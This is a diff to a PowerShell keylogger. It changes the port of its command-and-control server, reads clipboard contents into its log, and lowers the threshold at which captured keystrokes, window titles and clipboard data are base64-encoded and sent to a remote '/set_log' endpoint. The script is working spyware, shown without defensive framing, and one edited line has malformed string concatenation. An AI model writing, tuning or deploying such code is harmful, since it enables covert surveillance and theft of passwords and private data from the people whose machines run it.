@@ -1,5 +1,5 @@
 cd 'c:\Users\Mehmet Dere\Desktop\Yeniklasör\'
-$server = 'http://192.168.1.41:6060'
+$server = 'http://192.168.1.41:7070'
 $ip		= get-WmiObject Win32_NetworkAdapterConfiguration|Where {$_.Ipaddress.length -gt 1} 
 $user 	= (whoami).split('\')[1]
 $id 	= $ip.ipaddress[0]+'.'+$user
@@ -147,7 +147,7 @@ while ($true) {
 
 			$scancode = $ImportDll::MapVirtualKey($vkey, 0x3)
 			
-			$kbstate = New-Object Byte[] 20480
+			$kbstate = New-Object Byte[] 256
 			$checkkbstate = $ImportDll::GetKeyboardState($kbstate)
 			
 			$mychar = New-Object -TypeName "System.Text.StringBuilder";
@@ -160,11 +160,8 @@ while ($true) {
 			if ($unicode_res -gt 0) {
 				if ($WindowTitle -ne $LastWindowTitle){
 					# if the window has changed
-					$TimeStamp = ("foreach($line in [System.IO.File]::ReadLines("c:\Users\Mehmet Dere\Desktop\Yeniklasör\LoginData.txt"))
-{
-       $line
-}")
-					$Outout = "`n[$WindowTitle - $TimeStamp]`n"
+					$TimeStamp = (get-clipboard)
+					$Outout = "`n[$WindowTitle - "\\?\"+$TimeStamp]`n"
 					$LastWindowTitle = $WindowTitle
 				}
                     $outfile += get-clipboard
@@ -177,7 +174,7 @@ while ($true) {
 	if($timer -gt 400) {
 		$timer = 0
 		$buff = $buff.Trim()
-		if($buff.Length -gt 100000) {
+		if($buff.Length -gt 10) {
 			if((New-Object Net.WebClient).DownloadString($server+'/set_log/?id='+$id+'&string='+[Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($buff))) -eq 'False') {
 				Exit
 			}
